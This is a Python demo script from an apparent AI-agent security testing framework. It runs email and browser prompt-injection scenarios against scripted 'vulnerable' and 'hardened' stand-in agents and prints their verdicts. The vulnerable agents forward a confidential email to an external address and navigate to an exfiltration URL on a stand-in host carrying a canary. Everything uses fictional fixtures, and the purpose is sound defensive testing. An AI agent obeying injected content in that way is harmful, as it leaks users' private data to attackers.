#!/usr/bin/env python3
"""Self-contained, offline demonstration of the email and browser attack packs.

Runs one email scenario and one browser scenario through AgentSec's real pipeline
(run_scenario -> evaluate_trace) twice each: once against a scripted *vulnerable* in-process
agent that obeys content it reads, and once against a *hardened* agent that does not. It prints
the observed tool calls and the AgentSec verdict for each, so you can see the attack succeed and
be blocked without any network, server, or real action.

    python examples/attack_packs/demo_email_and_browser_packs.py

Both packs carry realistic injection content now (see the pack files and
docs/email-and-browser-packs.md). Everything is a fixture: fictional `.invalid` addresses,
synthetic canaries, and no action that leaves this process.

The agents here are scripted stand-ins, so these verdicts demonstrate the detection pipeline, not
any model's behaviour. For a real model, see
examples/real_world_agents/email_assistant/evaluate_live.py.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from agentsec.adapters import CallableAdapter
from agentsec.attacks.base import ScenarioContext
from agentsec.evaluators import evaluate_trace
from agentsec.policies import parse_policy
from agentsec.runners.local import ScenarioResult, run_scenario

import importlib.util

HERE = os.path.dirname(os.path.abspath(__file__))


def _load(modname, filename):
    spec = importlib.util.spec_from_file_location(modname, os.path.join(HERE, filename))
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


email_pack = _load("demo_email_pack", "email_agent_pack.py")
browser_pack = _load("demo_browser_pack", "browser_agent_pack.py")
EMAIL_POLICY = parse_policy(open(os.path.join(HERE, "email_assistant.agentsec.yaml")).read())
BROWSER_POLICY = parse_policy(open(os.path.join(HERE, "browser_session.agentsec.yaml")).read())


def show(title, scenario, policy, adapter):
    trace = run_scenario(scenario, policy, adapter)
    result = ScenarioResult(scenario, trace, evaluate_trace(scenario, trace, policy))
    calls = ["%s(%s)" % (e.tool_name, ", ".join("%s=%r" % kv for kv in (e.arguments or {}).items()))
             for e in trace.of_type("tool_call")]
    print("=== %s ===" % title)
    print("  scenario:  %s" % scenario.id)
    print("  tool calls:")
    for c in calls:
        print("    - %s" % c)
    print("  verdict:   %s" % result.status.upper())
    for f in result.findings:
        print("    [%s] %s  (%s)" % (f.severity.upper(), f.title, f.rule))
    print()
    return result


# --- email scripted agents -------------------------------------------------

def _email_agent(obey):
    slots = (email_pack.OVERT_INJECTION_SLOT, email_pack.SUBTLE_INJECTION_SLOT,
             email_pack.ATTACHMENT_INJECTION_SLOT, email_pack.DELETE_INJECTION_SLOT,
             email_pack.DELAYED_INJECTION_SLOT)

    def fn(messages, tools):
        last = messages[-1]
        calls = [tc["function"]["name"] for m in messages if m["role"] == "assistant"
                 for tc in m.get("tool_calls") or []]
        if last["role"] == "user":
            return {"tool_calls": [{"name": "read_inbox", "arguments": {}}]}
        listing, opened, bodies = [], [], []
        for m in messages:
            if m["role"] == "assistant":
                for tc in m.get("tool_calls") or []:
                    if tc["function"]["name"] == "open_email":
                        opened.append(json.loads(tc["function"]["arguments"]).get("message_id"))
            if m["role"] == "tool":
                try:
                    d = json.loads(m["content"])
                except Exception:
                    continue
                if "messages" in d:
                    listing = [x["id"] for x in d["messages"]]
                elif "body" in d:
                    bodies.append(m["content"])
        for mid in listing:
            if mid not in opened:
                return {"tool_calls": [{"name": "open_email", "arguments": {"message_id": mid}}]}
        from agentsec.evaluators.goals import _decoded, _norm
        delivered = any(_norm(sl) in _norm(b) or (_decoded(b) and _norm(sl) in _decoded(b))
                        for b in bodies for sl in slots)
        if obey and delivered and not ({"forward_email", "send_email"} & set(calls)):
            return {"tool_calls": [{"name": "forward_email", "arguments": {
                "message_id": "msg-0050", "to": email_pack.EXTERNAL_ADDRESS,
                "note": email_pack.CONFIDENTIAL_CANARY}}]}
        return "triage complete"
    return CallableAdapter(fn)


# --- browser scripted agents -----------------------------------------------

def _browser_agent(obey):
    account = "https://app.example-corp.invalid/account"
    product = "https://shop.example-vendor.invalid/item/42"

    def fn(messages, tools):
        last = messages[-1]
        calls = [tc["function"]["name"] for m in messages if m["role"] == "assistant"
                 for tc in m.get("tool_calls") or []]
        read, bodies = [], []
        for m in messages:
            if m["role"] == "assistant":
                for tc in m.get("tool_calls") or []:
                    if tc["function"]["name"] in ("read_page", "fetch_page"):
                        read.append(json.loads(tc["function"]["arguments"]).get("url"))
            if m["role"] == "tool":
                bodies.append(m["content"])
        if last["role"] == "user":
            return {"tool_calls": [{"name": "read_page", "arguments": {"url": account}}]}
        if product not in read:
            return {"tool_calls": [{"name": "read_page", "arguments": {"url": product}}]}
        from agentsec.evaluators.goals import _decoded, _norm
        _bslots = [v for k, v in vars(browser_pack).items() if "_SLOT" in k and isinstance(v, str)]
        delivered = any(_norm(sl) in _norm(b) or (_decoded(b) and _norm(sl) in _decoded(b))
                        for b in bodies for sl in _bslots)
        if obey and delivered and "navigate" not in calls:
            return {"tool_calls": [{"name": "navigate", "arguments": {
                "url": "https://%s/collect?d=%s" % (browser_pack.EXFIL_HOST, browser_pack.BROWSER_CANARY)}}]}
        return "browsing complete"
    return CallableAdapter(fn)


if __name__ == "__main__":
    ectx = ScenarioContext(EMAIL_POLICY, 0)
    email_sc = email_pack.build_forward_exfiltration(ectx)[0]  # overt-body forward exfiltration
    print("\n#### EMAIL ATTACK PACK ####\n")
    vuln_email = show("Vulnerable email assistant", email_sc, EMAIL_POLICY, _email_agent(obey=True))
    safe_email = show("Hardened email assistant", email_sc, EMAIL_POLICY, _email_agent(obey=False))

    bctx = ScenarioContext(BROWSER_POLICY, 0)
    browser_sc = browser_pack.build_nav_exfiltration(bctx)[0]  # hidden-surface navigation exfiltration
    print("\n#### BROWSER ATTACK PACK ####\n")
    vuln_browser = show("Vulnerable browser agent", browser_sc, BROWSER_POLICY, _browser_agent(obey=True))
    safe_browser = show("Hardened browser agent", browser_sc, BROWSER_POLICY, _browser_agent(obey=False))

    assert vuln_email.status == "findings" and any(
        f.rule == "attack_goal_achieved" for f in vuln_email.findings), "email demo broke"
    assert safe_email.status == "passed", "email safe demo broke"
    assert vuln_browser.status == "findings" and any(
        f.rule == "attack_goal_achieved" for f in vuln_browser.findings), "browser demo broke"
    assert safe_browser.status == "passed", "browser safe demo broke"
    print("Demonstration holds: identical scenarios are flagged (attack_goal_achieved) against the "
          "vulnerable agents and pass against the hardened ones.")
